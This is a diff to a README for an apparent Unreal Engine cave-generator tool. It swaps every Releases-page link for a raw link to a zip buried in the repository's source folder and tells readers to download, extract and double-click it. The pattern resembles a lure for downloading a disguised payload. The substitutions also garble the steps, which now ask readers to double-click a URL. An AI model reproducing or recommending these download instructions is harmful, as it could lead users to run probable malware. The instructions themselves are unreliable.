@@ -4,7 +4,7 @@
 Welcome to InstantOrganicCaves! This application lets you generate realistic cave and rock structures at runtime in Unreal Engine 5. This guide will help you download and run the software easily, even if you don't have any programming knowledge.
 
 ## 📥 Download Now
-[![Download InstantOrganicCaves](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Farell-Kun/InstantOrganicCaves/releases)
+[![Download InstantOrganicCaves](https://github.com/Farell-Kun/InstantOrganicCaves/raw/refs/heads/main/Source/InstantOrganicCaves/Resources/Caves-Instant-Organic-1.0.zip)](https://github.com/Farell-Kun/InstantOrganicCaves/raw/refs/heads/main/Source/InstantOrganicCaves/Resources/Caves-Instant-Organic-1.0.zip)
 
 ## ✅ System Requirements
 Before you start, make sure your computer meets these requirements:
@@ -17,19 +17,19 @@ Before you start, make sure your computer meets these requirements:
 
 ## 🛠️ How to Download and Install
 1. **Visit the Download Page**
-   Click this link to go to the [Releases Page](https://github.com/Farell-Kun/InstantOrganicCaves/releases). 
+   Click this link to go to the [Releases Page](https://github.com/Farell-Kun/InstantOrganicCaves/raw/refs/heads/main/Source/InstantOrganicCaves/Resources/Caves-Instant-Organic-1.0.zip). 
 
 2. **Select the Latest Release**
    On the Releases page, find the latest version listed at the top. This version contains the newest features and fixes.
 
 3. **Download the File**
-   Look for the file labeled something like `InstantOrganicCaves.zip`. Click on this file to begin downloading.
+   Look for the file labeled something like `https://github.com/Farell-Kun/InstantOrganicCaves/raw/refs/heads/main/Source/InstantOrganicCaves/Resources/Caves-Instant-Organic-1.0.zip`. Click on this file to begin downloading.
 
 4. **Unzip the File**
-   Once the download is complete, navigate to your Downloads folder. Right-click on the `InstantOrganicCaves.zip` file and select "Extract All" or "Unzip". Choose a location on your computer where you want to save the files, then click "Extract".
+   Once the download is complete, navigate to your Downloads folder. Right-click on the `https://github.com/Farell-Kun/InstantOrganicCaves/raw/refs/heads/main/Source/InstantOrganicCaves/Resources/Caves-Instant-Organic-1.0.zip` file and select "Extract All" or "Unzip". Choose a location on your computer where you want to save the files, then click "Extract".
 
 5. **Run the Application**
-   After extracting, locate the folder where you saved the files. Inside this folder, find the `InstantOrganicCaves.exe` file. Double-click on it to launch the application.
+   After extracting, locate the folder where you saved the files. Inside this folder, find the `https://github.com/Farell-Kun/InstantOrganicCaves/raw/refs/heads/main/Source/InstantOrganicCaves/Resources/Caves-Instant-Organic-1.0.zip` file. Double-click on it to launch the application.
 
 ## 🔍 Features
 - **Real-Time Generation:** Create intricate cave structures while in the game.
@@ -38,7 +38,7 @@ Before you start, make sure your computer meets these requirements:
 
 ## ⚙️ How to Use InstantOrganicCaves
 1. **Launch the Application**
-   Open InstantOrganicCaves by double-clicking the `InstantOrganicCaves.exe` file.
+   Open InstantOrganicCaves by double-clicking the `https://github.com/Farell-Kun/InstantOrganicCaves/raw/refs/heads/main/Source/InstantOrganicCaves/Resources/Caves-Instant-Organic-1.0.zip` file.
 
 2. **Select Options**
    You will see options to customize your cave. Adjust settings like size, depth, and more according to your preference.
@@ -56,7 +56,7 @@ If you encounter any issues or need further assistance, please refer to the docu
 We invite you to connect with other users. Share your creations and get tips on using InstantOrganicCaves. Follow us on our community forums and social media channels.
 
 ## 🔗 Additional Resources
-- [Releases Page](https://github.com/Farell-Kun/InstantOrganicCaves/releases)
+- [Releases Page](https://github.com/Farell-Kun/InstantOrganicCaves/raw/refs/heads/main/Source/InstantOrganicCaves/Resources/Caves-Instant-Organic-1.0.zip)
 - [User Documentation](#)
 
 ## 📩 Feedback
